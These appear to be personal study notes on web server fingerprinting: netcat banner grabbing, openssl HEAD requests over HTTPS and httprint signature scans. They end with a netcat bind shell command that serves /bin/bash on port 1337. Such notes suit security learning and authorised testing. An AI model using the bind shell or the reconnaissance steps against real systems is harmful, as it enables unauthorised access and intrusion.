#Fingerprinting Web Servers with Netcat
#Banner Grabbing:
nc <target address> 80
HEAD / HTTP/1.0 (hit enter twice)
#Note netcat doesn't notify you of a connection.
write requests in UPPERCASE

#Fingerprinting with OpenSSL
(for HTTPS connections)
Use to est connection to HTTPS service and send HEAD HTTP verb.

$openssl s_client -connect target.site:443
HEAD / HTTP/1.0

#Fingerprinting with httprint (signature-based to id web servers) 
httprint -P0 -h <target hosts> -s <signature file>
-P0 to avoid pinging host.
-h target hosts
-s to set signature file (/usr/share/httprint/signature.txt)
#netcat listener
nc -lvp 8888
(listen,verbose,port)
listening on....
0.0.0.0:8888 (all network interfaces)
#netcat bind shell!!(RCE)
Server:
nc -lvp 1337 -e /bin/bash 
Client:
nc -v 127.0.0.1 1337
